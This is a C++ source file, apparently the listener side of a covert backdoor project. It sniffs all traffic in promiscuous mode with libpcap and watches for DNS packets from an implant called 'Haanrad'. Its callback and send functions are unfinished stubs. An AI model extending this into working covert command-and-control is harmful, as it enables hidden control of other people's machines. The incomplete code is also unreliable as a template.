//
// Created by bensoer on 31/10/16.
//

#include <pcap.h>
#include <iostream>
#include <cstring>
#include "CommHandler.h"
#include "MessageQueue.h"
#include "../shared/Logger.h"
#include "../shared/PacketIdentifier.h"

CommHandler * CommHandler::instance = nullptr;

CommHandler::CommHandler(MessageQueue * messageQueue) {
    this->messageQueue = messageQueue;

    if(!getInterface()){
        Logger::debug(to_string(getpid()) + " CommHandler - There Was An Error Fetching The Interface For The Monitor");
    }
}

CommHandler* CommHandler::getInstance(MessageQueue * messageQueue) {
    if(CommHandler::instance == nullptr){
        CommHandler::instance = new CommHandler(messageQueue);
    }

    return CommHandler::instance;
}

/**
 * killListening is a helepr method so that the client can tell the NetworkMontior and libpcap to stop listening for
 * packets
 */
void CommHandler::killListening() {
    if(this->currentFD != nullptr){
        pcap_breakloop(this->currentFD);
    }
}

bool CommHandler::getInterface() {

    Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error(to_string(getpid()) + " CommHandler:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {


    char * BUFFER = (char *)(packet + 16);
    struct iphdr * ip = (struct iphdr *)BUFFER;
    int ipHeaderLength = (ip->ihl * 4);
    int protocol = (ip->protocol);

    //just to make sure we are in the right spot
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - IP Header Length: " + to_string(ipHeaderLength));
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Protocol: " + to_string(protocol));

    PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER);

    if(CommHandler::instance->haanradConnected == false){
        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Haanrad Hasn't Contacted. Filtering For Passwords Only");
        //haanrad hasn't contacted us yet. We should lookout for its packets so we know how to authenticate

        if(meta.applicationType != ApplicationType::DNS){
            return;
        }

        //application type here is DNS



    }






}

void CommHandler::listenForMessages() {

    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 subnetMask;
    bpf_u_int32 ip;

    //fetch network information for interface
    pcap_lookupnet(listeningInterface->name, &subnetMask, &ip, errbuf);

    //open up a raw socket and listen in promisc mode on it for data
    if((this->currentFD = pcap_open_live(listeningInterface->name, BUFSIZ, 1, -1, errbuf)) == NULL){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error in pcap_open_live");
        Logger::debug(string(errbuf));
        return;
    }

    //setup the libpcap filter
    struct bpf_program fp;
    //compile the filter
    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Compiling The Filter");
        return;
    }
    //set the filter
    if(pcap_setfilter(this->currentFD, &fp) == -1){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Setting The Filter");
        return;
    }

    u_char* args = NULL;
    //listen for packets
    pcap_loop(this->currentFD, 0, CommHandler::packetCallback, args);

}

long CommHandler::processMessagesToSend() {



}